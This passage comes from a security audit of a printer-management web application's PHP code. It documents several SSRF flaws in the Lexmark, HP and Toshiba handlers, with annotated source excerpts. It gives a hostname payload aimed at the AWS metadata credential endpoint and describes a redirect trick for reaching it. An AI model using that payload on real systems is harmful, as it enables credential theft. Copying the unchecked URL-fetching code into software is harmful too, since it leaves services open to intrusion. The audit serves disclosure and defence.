samsung/get_device_info.php:35:  $local_url = filter_var($printer_vo-&gt;str_host_address, FILTER_VALIDATE_DOMAIN,FILTER_FLAG_HOSTNAME);
</code></pre>
<p>Unfortunately, theses checks are extremely incomplete since:</p>
<ul>
<li>Curl is also insecurely used (without these checks) in some files; and</li>
<li>The function <code>file_get_contents()</code> is used to send HTTP/HTTPS requests to remote printer without any verification.</li>
</ul>
<p>We can find 419 calls to curl. If one of these calls is vulnerable to a SSRF vulnerability, then the SaaS solution can likely be compromised:</p>
<pre><code>kali$ rgrep -c curl .
419      
kali$ rgrep curl .
./toshiba/toshiba_soap_helper.php:    $ch = curl_init();
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_URL, $XRX_URL);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_POST, true);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_POSTFIELDS, $FULL_XRX);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSLVERSION, CURL_SSLVERSION_SSLv3);
./toshiba/toshiba_soap_helper.php:        $response = curl_exec($ch);
./toshiba/toshiba_soap_helper.php:        $error = curl_error($ch);
./toshiba/toshiba_soap_helper.php:        curl_close($ch);
./toshiba/toshiba_soap_helper.php:    $ch = curl_init();
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_URL, $XRX_URL);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_MAXREDIRS, 10);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, "POST");
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_POST, true);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_POSTFIELDS, $post_data);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
./toshiba/toshiba_soap_helper.php:    curl_setopt($ch, CURLOPT_HTTPHEADER, [
./toshiba/toshiba_soap_helper.php:        $response = curl_exec($ch);
./toshiba/toshiba_soap_helper.php:        $error = curl_error($ch);
./toshiba/toshiba_soap_helper.php:        curl_close($ch);
./lexmark/update.php:            $ch = curl_init();
./lexmark/update.php:            curl_setopt($ch, CURLOPT_URL, 'ftp://' . $local_url . '/printerlogic.fls');
./lexmark/update.php:            curl_setopt($ch, CURLOPT_USERPWD, $username . ":" . $password);
./lexmark/update.php:            curl_setopt($ch, CURLOPT_UPLOAD, true);
./lexmark/update.php:            curl_setopt($ch, CURLOPT_BINARYTRANSFER, true);
./lexmark/update.php:            curl_setopt($ch, CURLOPT_INFILE, $fp);
./lexmark/update.php:            curl_setopt($ch, CURLOPT_INFILESIZE, filesize(ABSPATH . 'console_release/lexmark/printerlogic.fls'));
./lexmark/update.php:            curl_exec($ch);
./lexmark/update.php:            $error_no = curl_error($ch);
./lexmark/update.php:            curl_close($ch);
./lexmark/update.php:        $ch = curl_init();
./lexmark/update.php:        curl_setopt($ch, CURLOPT_URL, 'ftp://' . $local_url . '/printerlogic.ucf');
./lexmark/update.php:        curl_setopt($ch, CURLOPT_UPLOAD, true);
./lexmark/update.php:        curl_setopt($ch, CURLOPT_INFILE, $temp_file);
./lexmark/update.php:        curl_setopt($ch, CURLOPT_INFILESIZE, mb_strlen($content, '8bit'));
./lexmark/update.php:        curl_exec($ch);
[...]
</code></pre>
<p>For example, we can find several SSRF vulnerabilities.</p>
<p>The following list is not exhaustive and the audited files were randomly chosen.</p>
<p><a id="va-ssrf-04"></a></p>
<h3>Details - 4 SSRF vulnerabilities in /var/www/app/console_release/lexmark/update.php</h3>
<p>The <code>$url</code> and <code>$new_url</code> variables are attacker-controlled and the output of the <code>file_get_contents()</code> function will be displayed to the attacker. An attacker can use:</p>
<ul>
<li>A malicious hostname for a printer (e.g. <code>169.254.169.254/latest/meta-data/iam/security-credentials/?</code>), to display the AWS security credentials;</li>
<li>A legit hostname, the remote webserver will provide a 301 redirect to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code>, since the <code>file_get_contents()</code> function will follow any HTTP redirect:</li>
</ul>
<p>Content of <code>/var/www/app/console_release/lexmark/update.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">209</span>                 <span style="color: #19177C">$url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$this_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/cgi-bin/direct/printer/prtappse/semenu?page=bundles&quot;</span>;

<span style="color: #666666">215</span>                     <span style="color: #19177C">$new_url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$this_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/esf/prtappse/semenu?page=bundles&quot;</span>;

<span style="color: #666666">223</span>                         <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$new_url</span>);      <span style="color: #408080; font-style: italic">// [1] SSRF #1</span>

<span style="color: #666666">228</span>                             <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$new_url</span>);  <span style="color: #408080; font-style: italic">// [2] SSRF #2</span>


<span style="color: #666666">234</span>                     <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$url</span>);              <span style="color: #408080; font-style: italic">// [3] SSRF #3</span>

<span style="color: #666666">239</span>                         <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$url</span>);          <span style="color: #408080; font-style: italic">// [4] SSRF #4</span>

<span style="color: #666666">247</span>             <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$contents</span>;                                         <span style="color: #408080; font-style: italic">// [5] display of the output of the SSRF</span>
</pre></div>

<p><a id="va-ssrf-05"></a></p>
<h3>Details - 1 blind SSRF vulnerability in /var/www/app/console_release/hp/installApp.php</h3>
<p>This file is reachable without authentication and contains a blind SSRF vulnerability. The <code>$printer_vo-&gt;str_host_address</code> is controlled by any admin:</p>
<p>Content of <code>/var/www/app/console_release/hp/installApp.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">25</span> <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">curl_get_contents</span>(<span style="color: #19177C">$url</span>)
 <span style="color: #666666">26</span> {
 <span style="color: #666666">27</span>     <span style="color: #19177C">$ch</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_init</span>();
 <span style="color: #666666">28</span>
 <span style="color: #666666">29</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_HEADER, <span style="color: #666666">0</span>);
 <span style="color: #666666">30</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_RETURNTRANSFER, <span style="color: #666666">1</span>);
 <span style="color: #666666">31</span>     <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_URL, <span style="color: #19177C">$url</span>);
 <span style="color: #666666">32</span>
 <span style="color: #666666">33</span>     <span style="color: #19177C">$data</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_exec</span>(<span style="color: #19177C">$ch</span>);
 <span style="color: #666666">34</span>     <span style="color: #008000">curl_close</span>(<span style="color: #19177C">$ch</span>);
 <span style="color: #666666">35</span>
 <span style="color: #666666">36</span>     <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$data</span>;
 <span style="color: #666666">37</span> }
[<span style="color: #666666">...</span>]
 <span style="color: #666666">73</span>         <span style="color: #19177C">$filePath</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:80/DevMgmt/DiscoveryTree.xml&quot;</span>;
 <span style="color: #666666">74</span>         <span style="color: #408080; font-style: italic">// @file_get_contents was not working on the new HP but this works on all of them.</span>
 <span style="color: #666666">75</span>         <span style="color: #19177C">$file</span> <span style="color: #666666">=</span> curl_get_contents(<span style="color: #19177C">$filePath</span>); <span style="color: #408080; font-style: italic">// [1] SSRF #1</span>
</pre></div>

<p><a id="va-ssrf-06"></a></p>
<h3>Details - 2 blind SSRF vulnerabilities in /var/www/app/console_release/hp/log_off_single_sign_on.php</h3>
<p>2 SSRF vulnerabilities on lines 37 and 128 in <code>/var/www/app/console_release/hp/log_off_single_sign_on.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">27</span>     <span style="color: #19177C">$IP_ADDR</span> <span style="color: #666666">=</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span>;

 <span style="color: #666666">37</span>         <span style="color: #19177C">$file</span> <span style="color: #666666">=</span> <span style="color: #666666">@</span><span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$h_tag</span> <span style="color: #666666">.</span> <span style="color: #19177C">$IP_ADDR</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:80/DevMgmt/DiscoveryTree.xml&quot;</span>);             <span style="color: #408080; font-style: italic">// [1] SSRF #1</span>

<span style="color: #666666">123</span>     <span style="color: #19177C">$sendUrl</span> <span style="color: #666666">=</span> <span style="color: #19177C">$XRX_URL</span> <span style="color: #666666">.</span> <span style="color: #19177C">$Authentication</span>[<span style="color: #BA2121">&#39;ResourceURI&#39;</span>];
<span style="color: #666666">128</span>     <span style="color: #19177C">$response_reserve</span> <span style="color: #666666">=</span> processCurl(<span style="color: #19177C">$XRX_SCHEMA</span>, <span style="color: #19177C">$XRX_TO</span>, <span style="color: #19177C">$XRX_BODY</span>, <span style="color: #19177C">$sendUrl</span>, <span style="color: #008000; font-weight: bold">false</span>, <span style="color: #BA2121">&quot;guest&quot;</span>, <span style="color: #BA2121">&quot;&quot;</span>);  <span style="color: #408080; font-style: italic">// [2] SSRF #2</span>
</pre></div>

<p>The function <code>file_get_contents()</code> will follow any HTTP redirect.</p>
<p><code>$sendURL</code> comes from <code>$XRX_URL</code> (line 123) that comes from <code>$IP_ADDR</code> (<code>console_release/hp/hp_soap_helper.php</code>) coming from the hostname of the printer, which is an attacker-controlled value. With the <code>processCurl()</code> function implemented in <code>/var/www/app/console_release/hp/hp_soap_helper.php</code>, without any check regarding the validity of the remote URL (defined in <code>$sendUrl</code>):</p>
<p>Content of <code>/var/www/app/console_release/hp/log_off_single_sign_on.php</code> with <code>processCurl()</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">47</span>         <span style="color: #008000; font-weight: bold">function</span> <span style="color: #0000FF">processCurl</span>(<span style="color: #19177C">$XRX_SCHEMA</span>, <span style="color: #19177C">$XRX_TO</span>, <span style="color: #19177C">$this_XRX_BODY</span>, <span style="color: #19177C">$sendUrl</span>, <span style="color: #19177C">$showXML</span>, <span style="color: #19177C">$XRX_USERNAME</span>, <span style="color: #19177C">$XRX_PASSWORD</span>)
 <span style="color: #666666">48</span>         {
 <span style="color: #666666">49</span>                 <span style="color: #19177C">$XRX_SOAPSTART</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&lt;s:Envelope</span>
<span style="color: #BA2121"> 50          xmlns:s=&quot;http://www.w3.org/2003/05/soap-envelope&quot;</span>
<span style="color: #BA2121"> 51                  xmlns:a=&quot;http://schemas.xmlsoap.org/ws/2004/08/addressing&quot;&gt;</span>
<span style="color: #BA2121"> 52          &lt;s:Header&gt;</span>
<span style="color: #BA2121"> 53                  &lt;a:Action s:mustUnderstand=&quot;1&quot;&gt;&#39;</span>;
 <span style="color: #666666">54</span>                 <span style="color: #19177C">$XRX_ADDRESS</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;http://schemas.xmlsoap.org/ws/2004/08/addressing/role/anonymous&#39;</span>;
 <span style="color: #666666">55</span>                 <span style="color: #19177C">$XRX_MESSAGE</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&lt;a:MessageID&gt;urn:uuid:&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$this</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getGUID</span>() <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&lt;/a:MessageID&gt;&quot;</span>;
 <span style="color: #666666">56</span>                 <span style="color: #19177C">$XRX_SOAPEND</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&#39;&lt;/s:Envelope&gt;&#39;</span>;
 <span style="color: #666666">57</span>                 <span style="color: #19177C">$XRX_REPLY_TO</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&lt;a:ReplyTo&gt;&lt;a:Address&gt;&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_ADDRESS</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&lt;/a:Address&gt;&lt;/a:ReplyTo&gt;&quot;</span>;
 <span style="color: #666666">58</span>                 <span style="color: #19177C">$XRX_BODY</span> <span style="color: #666666">=</span> <span style="color: #19177C">$this_XRX_BODY</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&lt;/s:Body&gt;&#39;</span>;
 <span style="color: #666666">59</span>                 <span style="color: #19177C">$sendReq</span> <span style="color: #666666">=</span> <span style="color: #19177C">$XRX_SOAPSTART</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_SCHEMA</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;&lt;/a:Action&gt;&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_MESSAGE</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_REPLY_TO</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_TO</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&#39;&lt;/s:Header&gt;&#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_BODY</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_SOAPEND</span>;
 <span style="color: #666666">60</span>
 <span style="color: #666666">61</span>                 <span style="color: #19177C">$headers</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>(
 <span style="color: #666666">62</span>                         <span style="color: #BA2121">&quot;Content-Type: application/soap_xml; charset=utf-8&quot;</span>,
 <span style="color: #666666">63</span>                         <span style="color: #BA2121">&quot;SOAPAction: </span><span style="color: #BB6622; font-weight: bold">\&quot;\&quot;</span><span style="color: #BA2121">&quot;</span>,
 <span style="color: #666666">64</span>                 );
 <span style="color: #666666">65</span>                 <span style="color: #19177C">$ch</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_init</span>();
 <span style="color: #666666">66</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_URL, <span style="color: #19177C">$sendUrl</span>);
 <span style="color: #666666">67</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_USERPWD, <span style="color: #19177C">$XRX_USERNAME</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;:&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$XRX_PASSWORD</span>);
 <span style="color: #666666">68</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_HTTPAUTH, CURLAUTH_BASIC);
 <span style="color: #666666">69</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_POST, <span style="color: #008000; font-weight: bold">true</span>);
 <span style="color: #666666">70</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_POSTFIELDS, <span style="color: #19177C">$sendReq</span>);
 <span style="color: #666666">71</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_HTTPHEADER, <span style="color: #19177C">$headers</span>);
 <span style="color: #666666">72</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_RETURNTRANSFER, <span style="color: #666666">1</span>);
 <span style="color: #666666">73</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSL_VERIFYHOST, <span style="color: #008000; font-weight: bold">false</span>);
 <span style="color: #666666">74</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_SSL_VERIFYPEER, <span style="color: #008000; font-weight: bold">false</span>);
 <span style="color: #666666">75</span>                 <span style="color: #008000">curl_setopt</span>(<span style="color: #19177C">$ch</span>, CURLOPT_TIMEOUT, <span style="color: #666666">30</span>);
 <span style="color: #666666">76</span>                 <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">77</span>                 <span style="color: #008000; font-weight: bold">try</span> {
 <span style="color: #666666">78</span>                         <span style="color: #19177C">$response</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_exec</span>(<span style="color: #19177C">$ch</span>);
 <span style="color: #666666">79</span>                         <span style="color: #19177C">$error</span> <span style="color: #666666">=</span> <span style="color: #008000">curl_error</span>(<span style="color: #19177C">$ch</span>);
 <span style="color: #666666">80</span>                         <span style="color: #008000; font-weight: bold">if</span> (<span style="color: #19177C">$error</span> <span style="color: #666666">!=</span> <span style="color: #BA2121">&quot;&quot;</span>) {
 <span style="color: #666666">81</span>                 <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">error = &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$error</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">&quot;</span>;
 <span style="color: #666666">82</span>                 Log<span style="color: #666666">::</span><span style="color: #7D9029">error</span>(<span style="color: #BA2121">&#39;hp_soap_helper error: &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$error</span>);
 <span style="color: #666666">83</span>             }
 <span style="color: #666666">84</span>                         <span style="color: #008000">curl_close</span>(<span style="color: #19177C">$ch</span>);
 <span style="color: #666666">85</span>                 } <span style="color: #008000; font-weight: bold">catch</span> (Exception <span style="color: #19177C">$ex</span>) {
 <span style="color: #666666">86</span>                         <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\n</span><span style="color: #BA2121">Fail = &quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$ex</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>();
 <span style="color: #666666">87</span>             Log<span style="color: #666666">::</span><span style="color: #7D9029">error</span>(<span style="color: #BA2121">&#39;hp_soap_helper exception: &#39;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$ex</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getMessage</span>());
 <span style="color: #666666">88</span>                 }
 <span style="color: #666666">89</span>                 <span style="color: #008000; font-weight: bold">return</span> <span style="color: #19177C">$response</span>;
 <span style="color: #666666">90</span>         }   
</pre></div>

<p><a id="va-ssrf-07"></a></p>
<h3>Details - 2 SSRF vulnerabilities in /var/www/app/console_release/hp/badgeSetup.php</h3>
<p>The first SSRF is located on line 96. The <code>$IP_ADDR</code> corresponds to the attacker-controlled hostname of the remote printer. For example, by defining <code>169.254.169.254/latest/meta-data/iam/security-credentials/?</code>, the resulting URL will be: <code>http://169.254.169.254/latest/meta-data/iam/security-credentials/?/DevMgmt/DiscoveryTree.xml</code> corresponding to <code>http://169.254.169.254/latest/meta-data/iam/security-credentials</code> used by AWS to display security credentials.</p>
<p>The second SSRF is located on line 219 using the insecure function <code>processCurl()</code> with the answer being printed on line 224:</p>
<p>Content of <code>/var/www/app/console_release/hp/badgeSetup.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
[<span style="color: #666666">...</span>]
 <span style="color: #666666">96</span>         <span style="color: #19177C">$file</span> <span style="color: #666666">=</span> <span style="color: #666666">@</span><span style="color: #008000">file_get_contents</span>( <span style="color: #19177C">$h_tag</span> <span style="color: #666666">.</span> <span style="color: #19177C">$IP_ADDR</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/DevMgmt/DiscoveryTree.xml&quot;</span>, <span style="color: #008000; font-weight: bold">false</span>, <span style="color: #008000">stream_context_create</span>( <span style="color: #19177C">$arrContextOperations</span> )); <span style="color: #408080; font-style: italic">// ## SSRF #1</span>
 <span style="color: #666666">97</span>         <span style="color: #19177C">$doc</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> DOMDocument();
 <span style="color: #666666">98</span> 
 <span style="color: #666666">99</span>         <span style="color: #008000; font-weight: bold">if</span>( <span style="color: #19177C">$file</span> <span style="color: #666666">!=</span> <span style="color: #BA2121">&quot;&quot;</span> )
<span style="color: #666666">100</span>         {
<span style="color: #666666">101</span>                 <span style="color: #19177C">$doc</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">loadXML</span>( <span style="color: #19177C">$file</span> );
<span style="color: #666666">102</span>                 <span style="color: #19177C">$xpath</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> DOMXPath( <span style="color: #19177C">$doc</span> );
<span style="color: #666666">103</span>                 <span style="color: #19177C">$nodes</span> <span style="color: #666666">=</span> <span style="color: #19177C">$doc</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">getElementsByTagName</span>(<span style="color: #BA2121">&#39;*&#39;</span>);
<span style="color: #666666">104</span>                 <span style="color: #19177C">$features</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">array</span>();                                                                                                                                                            
<span style="color: #666666">105</span>
[<span style="color: #666666">...</span>]
<span style="color: #666666">219</span> <span style="color: #19177C">$response</span> <span style="color: #666666">=</span>  processCurl( <span style="color: #19177C">$XRX_SCHEMA</span>, <span style="color: #19177C">$XRX_TO</span>, <span style="color: #19177C">$XRX_BODY</span>, <span style="color: #19177C">$sendUrl</span>, <span style="color: #008000; font-weight: bold">false</span>, <span style="color: #19177C">$XRX_USERNAME</span>, <span style="color: #19177C">$XRX_PASSWORD</span> );                                   <span style="color: #408080; font-style: italic">// # SSRF #2</span>
<span style="color: #666666">220</span> <span style="color: #008000; font-weight: bold">if</span>( GLOBALS<span style="color: #666666">::</span><span style="color: #19177C">$CONSOLE_RELEASE_TESTING</span> <span style="color: #666666">==</span> <span style="color: #666666">1</span> )
<span style="color: #666666">221</span> {               
<span style="color: #666666">222</span>         \Storage<span style="color: #666666">::</span><span style="color: #7D9029">disk</span>(<span style="color: #BA2121">&#39;cache&#39;</span>)<span style="color: #666666">-&gt;</span><span style="color: #7D9029">append</span>(<span style="color: #BA2121">&quot;hp/badge_setup_1.txt&quot;</span>, <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\r\n\r\n</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$response</span> );
<span style="color: #666666">223</span> }               
<span style="color: #666666">224</span> <span style="color: #008000; font-weight: bold">echo</span> <span style="color: #BA2121">&quot;</span><span style="color: #BB6622; font-weight: bold">\n\n</span><span style="color: #BA2121">&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$response</span>;    
</pre></div>

<p>A similar vulnerability is present in several files (e.g. <code>console_release/hp/log_off_single_sign_on.php:37</code>, <code>./console_release/hp/install_popup_load.php:137</code>, ...).</p>
<p><a id="va-ssrf-08"></a></p>
<h3>Details - 2 blind SSRF vulnerabilities in /var/www/app/console_release/lexmark/dellCheck.php</h3>
<p>Lines 20 and 24: the <code>$printer_vo-&gt;str_host_address</code> variable is controlled by an attacker and is used without any filtering:</p>
<p>Content of <code>/var/www/app/console_release/lexmark/dellCheck.php</code>:</p>
<div class="colorful" style="background: #f8f8f8"><pre style="line-height: 125%"><span></span>  1 <span style="color: #BC7A00">&lt;?php</span>
  <span style="color: #666666">2</span> <span style="color: #008000; font-weight: bold">require_once</span>( <span style="color: #BA2121">&quot;global.php&quot;</span> );
  <span style="color: #666666">3</span> <span style="color: #008000; font-weight: bold">require_once</span>(ABSPATH<span style="color: #666666">.</span><span style="color: #BA2121">&quot;lib/dao/dbopen.php&quot;</span>);
  <span style="color: #666666">4</span> <span style="color: #008000; font-weight: bold">require_once</span>( ABSPATH <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;lib/dao/printer_dao.php&quot;</span> );
  <span style="color: #666666">5</span> 
  <span style="color: #666666">6</span> <span style="color: #19177C">$printer_dao</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> printer_dao();
  <span style="color: #666666">7</span> <span style="color: #19177C">$printer_vo</span> <span style="color: #666666">=</span> <span style="color: #008000; font-weight: bold">new</span> printer_vo();
  <span style="color: #666666">8</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">id</span> <span style="color: #666666">=</span> requestint( <span style="color: #BA2121">&#39;printer_id&#39;</span>, <span style="color: #666666">0</span> );
  <span style="color: #666666">9</span> <span style="color: #19177C">$printer_dao</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">load</span>( <span style="color: #19177C">$printer_vo</span> );
 <span style="color: #666666">10</span> 
 <span style="color: #666666">11</span> <span style="color: #19177C">$url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/cgi-bin/direct/printer/prtappse/semenu?page=bundles&quot;</span>;
 <span style="color: #666666">12</span> <span style="color: #19177C">$url_headers</span> <span style="color: #666666">=</span> <span style="color: #666666">@</span><span style="color: #008000">get_headers</span>(<span style="color: #19177C">$url</span>);
 <span style="color: #666666">13</span> <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span><span style="color: #19177C">$url_headers</span> <span style="color: #666666">||</span> <span style="color: #008000">strpos</span>(<span style="color: #19177C">$url_headers</span>[<span style="color: #666666">0</span>], <span style="color: #BA2121">&#39;200&#39;</span>) <span style="color: #666666">===</span> <span style="color: #008000; font-weight: bold">false</span>)
 <span style="color: #666666">14</span> {
 <span style="color: #666666">15</span>     <span style="color: #19177C">$new_url</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;http://&quot;</span> <span style="color: #666666">.</span> <span style="color: #19177C">$printer_vo</span><span style="color: #666666">-&gt;</span><span style="color: #7D9029">str_host_address</span> <span style="color: #666666">.</span> <span style="color: #BA2121">&quot;/esf/prtappse/semenu?page=bundles&quot;</span>;
 <span style="color: #666666">16</span>     <span style="color: #19177C">$new_url_headers</span> <span style="color: #666666">=</span> <span style="color: #666666">@</span><span style="color: #008000">get_headers</span>(<span style="color: #19177C">$new_url</span>);
 <span style="color: #666666">17</span>     <span style="color: #008000; font-weight: bold">if</span>(<span style="color: #666666">!</span><span style="color: #19177C">$new_url_headers</span> <span style="color: #666666">||</span> <span style="color: #008000">strpos</span>(<span style="color: #19177C">$new_url_headers</span>[<span style="color: #666666">0</span>], <span style="color: #BA2121">&#39;200&#39;</span>) <span style="color: #666666">===</span> <span style="color: #008000; font-weight: bold">false</span>)
 <span style="color: #666666">18</span>         <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #BA2121">&quot;&quot;</span>;
 <span style="color: #666666">19</span>     <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">20</span>         <span style="color: #19177C">$contents</span> <span style="color: #666666">=</span> <span style="color: #008000">file_get_contents</span>(<span style="color: #19177C">$new_url</span>); <span style="color: #408080; font-style: italic">// SSRF #1</span>
 <span style="color: #666666">21</span> }
 <span style="color: #666666">22</span> <span style="color: #008000; font-weight: bold">else</span>
 <span style="color: #666666">23</span> {
